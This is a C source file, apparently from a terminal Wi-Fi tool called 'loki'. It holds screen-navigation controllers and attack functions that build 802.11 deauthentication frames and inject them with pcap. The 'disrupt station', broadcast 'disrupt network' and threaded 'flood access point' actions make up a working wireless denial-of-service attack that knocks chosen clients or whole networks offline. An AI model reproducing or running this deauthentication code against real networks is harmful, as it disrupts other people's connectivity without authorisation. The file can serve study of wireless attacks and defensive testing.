#include <stdlib.h>
#include <pthread.h>
#include "controllers.h"

static void action_distrupt_station(struct loki_state*);
static void action_distrupt_network(struct loki_state*);
static void action_flood_ap(struct loki_state*);
static void *flood(void*);
static void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, uint8_t, pcap_t*, uint32_t);

static flood_ap = 0;

struct mode_controller *create_mode_controller() {
	struct mode_controller *controller;

	controller = (struct mode_controller*)malloc(sizeof(struct mode_controller));

	return controller;
}

struct controller *create_controller() {
	struct controller *controller;

	controller = (struct controller*)malloc(sizeof(struct controller));

	return controller;
}

void controller_overview_left(int code, struct frame_log *log) {
}

void controller_overview_centre(int code, struct frame_log *log) {
	
	switch(code) {
	case 'j':
		if(log->beacon.selected + 1 < log->beacon.num)
			log->beacon.selected++;
		else
			log->beacon.selected = 0;
		break;
	case 'k':
		if(log->beacon.selected - 1 >= 0)
			log->beacon.selected--;
		else
			log->beacon.selected = log->beacon.num-1;

		break;
	}
}

void controller_overview_right(int code, struct frame_log *log) {
	switch(code) {
	case 'j':
		if(log->proberq.selected + 1 < log->proberq.num)
			log->proberq.selected++;
		else
			log->proberq.selected = 0;
		break;
	case 'k':
		if(log->proberq.selected - 1 >= 0)
			log->proberq.selected--;
		else
			log->proberq.selected = log->proberq.num-1;

		
		break;
	}
}

void controller_overview_mode(int code, struct loki_state *state) {
	switch(code) {

	case 'h':
	case 'l':
		if(state->controllers.overview->selected == state->controllers.overview->centre) {
			state->controllers.overview->selected = state->controllers.overview->right;
			state->log->beacon.selected = -1;
			state->log->proberq.selected = 0;
		} else {
			state->controllers.overview->selected = state->controllers.overview->centre;
			state->log->beacon.selected = 0;
			state->log->proberq.selected = -1;
		}
		break;

	case 'j':
	case 'k':
		state->controllers.overview->selected->input(code, state->log);
		break;

	case '\n':
		pthread_mutex_lock(&scrmutex);
		if(state->controllers.overview->selected == state->controllers.overview->centre) {
			state->current_controller = state->controllers.ap;
			state->current = state->screens.ap;
			pthread_mutex_unlock(&scrmutex);
		} else {
			state->current_controller = state->controllers.sta;
			state->current = state->screens.sta;
			pthread_mutex_unlock(&scrmutex);
		}
		break;
	}
}

void controller_ap_mode(int code, struct loki_state *state) {
	struct beacon_ssid_item *item = state->log->beacon.list;
	struct macaddr_list_item *addr;
	int i = 0;
	switch(code) {
	case 'd':
		action_distrupt_station(state);
		break;

	case 'D':
		action_distrupt_network(state);
		break;

	case 'F':
		if(flood_ap) {
			flood_ap = 0;
			state->status_msg = NULL;
			break;
		}
		flood_ap = 1;
		action_flood_ap(state);
		break;
		
	case 'h':
	case 'l':
		if(state->controllers.ap->selected == state->controllers.ap->centre) {
			state->controllers.ap->selected = state->controllers.ap->right;
		} else {
			state->controllers.ap->selected = state->controllers.ap->centre;
		}
		break;

	case 'j':

		if(state->controllers.ap->selected == state->controllers.ap->centre) {
			do {
				if(i++ == state->log->beacon.selected)
					break;
			} while( (item = item->next) != NULL);
			
			if(item->selected + 1 == item->bss_count)
				item->selected = 0;
			else
				item->selected++;

			
		} else {
			
			i = 0;
			struct beacon_frame_item *apitem = state->log->beacon.list;
			do {
				if(i++ == state->log->beacon.selected) {

					i = 0;
					apitem = item->list;

					if(apitem == NULL) return;
					
					do {
						if(i++ == item->selected) {
							break;
						}

					} while( (item = item->next));
					break;

				}

			} while( (item = item->next) != NULL);
			
			if(apitem->sta_selected + 1 == apitem->sta_count)
				apitem->sta_selected = 0;
			else
				apitem->sta_selected++;
		}

		
		break;

	case 'k':
		
		if(state->controllers.ap->selected == state->controllers.ap->centre) {
			do {
				if(i++ == state->log->beacon.selected)
					break;
			} while( (item = item->next) != NULL);
			
			if(item->selected == 0)
				item->selected = item->bss_count-1;
			else
				item->selected--; 
	
		} else {

			i = 0;
			struct beacon_frame_item *apitem = state->log->beacon.list;
			do {
				if(i++ == state->log->beacon.selected) {

					i = 0;
					apitem = item->list;

					if(apitem == NULL) return;
					
					do {
						if(i++ == item->selected) {
							break;
						}

					} while( (item = item->next));
					break;

				}

			} while( (item = item->next) != NULL);
			
			if(apitem->sta_selected == 0)
				apitem->sta_selected = apitem->sta_count-1;
			else
				apitem->sta_selected--;
		}

		break;
	case 0x1b:
		pthread_mutex_lock(&scrmutex);
		state->current_controller = state->controllers.overview;
		state->current = state->screens.overview;
		state->status_msg = NULL;
		flood_ap = 0;
		pthread_mutex_unlock(&scrmutex);
		break;
	}
}

void controller_sta_mode(int code, struct loki_state *state) {
	switch(code) {
	case 0x1b:
		pthread_mutex_lock(&scrmutex);
		state->current_controller = state->controllers.overview;
		state->current = state->screens.overview;
		state->status_msg = NULL;
		pthread_mutex_unlock(&scrmutex);
		break;
	}
}

void action_distrupt_station(struct loki_state *state) {
	struct beacon_ssid_item *ssitem = state->log->beacon.list;
	struct beacon_frame_item *item = NULL;
	struct macaddr_list_item *addr;
	uint8_t *macSta, *macAp;
	uint16_t i;

	i = 0;
	do {
		if(i++ == state->log->beacon.selected) {
			i = 0;
			item = ssitem->list;
			do {
				if(i++ == ssitem->selected)
					break;

			} while( (item = item->next));
			break;
		}

	} while( (ssitem = ssitem->next) != NULL);

	addr = item->list;
	macAp = item->mac;

	i = 0;
	if((addr = item->list) == NULL)
		return;

	do {
		if(i++ == item->sta_selected)
			break;

	} while( (addr = addr->next) != NULL);

	macSta = addr->addr;
	char *status = (char*)malloc(sizeof(char)*48);
	sprintf(status, "Disrupt station %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
	set_status_message(status, state);
	action_send_disruption(macAp, macSta, macAp, 10, 0, state->handle, 50000);
}

void action_distrupt_network(struct loki_state *state) {
	struct beacon_ssid_item *ssitem = state->log->beacon.list;
	struct beacon_frame_item *item = NULL;
	uint8_t macSta[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
		*macAp;
	uint16_t i;

	i = 0;
	do {
		
		if(i++ == state->log->beacon.selected) {
			i = 0;
			item = ssitem->list;
			do {
				if(i++ == ssitem->selected)
					break;

			} while( (item = item->next));
			break;
		}

	} while( (ssitem = ssitem->next) != NULL);

	macAp = item->mac;

	char *status = (char*)malloc(sizeof(char)*48);
	sprintf(status, "Disrupt network %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
	set_status_message(status, state);

	action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle, 50000);
}

void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uint16_t num, uint8_t broadcast, pcap_t *handle, uint32_t sleep) {
	struct header_radiotap *tap;
	struct mac80211_management_hdr *headerToSta, *headerToAp;
	struct mac80211_control ctrl;
	uint32_t total;
	uint8_t *packetToSta, *packetToAp;

	size_t lenSta, lenAp;

	ctrl = (struct mac80211_control) {
		.protocol = 0x0,
		.type = 0x0,
		.subtype = 0xc,
		.toDS = 0,
		.fromDS = 0,
		.frags = 0,
		.retry = 0,
		.powerman = 0,
		.data = 0,
		.protected = 0,
		.order = 0,
	};

	tap = construct_header_radiotap();

	headerToSta = construct_header_management(macAp, macSta, bssid, &ctrl);
	headerToAp = construct_header_management(macSta, macAp, bssid, &ctrl);

	total = 0;
	while(total++ < num) {
		headerToSta->seqctrl = total<<4;
		headerToAp->seqctrl = total<<4;
			packetToSta = construct_packet(tap, headerToSta, 0x7, &lenSta);

		if(!broadcast)
			packetToAp = construct_packet(tap, headerToAp, 0x3, &lenAp);
		
		pcap_inject(handle, (void*)packetToSta, (int)lenSta);

		if(!broadcast)
			pcap_inject(handle, (void*)packetToAp, (int)lenAp);
		
		usleep(sleep);
		
		if(!broadcast)
			free(packetToAp);
	}
}

void action_flood_ap(struct loki_state *state) {
	struct beacon_frame_item *item = state->log->beacon.list;
	uint8_t *macAp;
	uint16_t i;
	char *status;

	pthread_t flooder;

	i = 0;
	do {
		if(i++ == state->log->beacon.selected)
			break;

	} while( (item = item->next) != NULL);
	macAp = item->mac;

	status = (char*)malloc(sizeof(char)*48);
	sprintf(status, "Flooding access point %s", print_mac_address(macAp));
	set_status_message(status, state);
	pthread_create( &flooder, NULL, flood, (void*)state);
}

void *flood(void *data) {
	struct loki_state *state = (struct loki_state*)data;
	struct beacon_frame_item *item = state->log->beacon.list;
	struct macaddr_list_item *addr;
	uint8_t *macAp, *macSta;
	uint16_t i;

	i = 0;
	do {
		if(i++ == state->log->beacon.selected)
			break;

	} while( (item = item->next) != NULL);

	macSta = item->mac;

	i = 0;
	if((addr = item->list) == NULL)
		return;

	do {
		if(i++ == item->sta_selected)
			break;

	} while( (addr = addr->next) != NULL);

	macAp = addr->addr;

	while(flood_ap) {
		action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle, 500);
	}
}
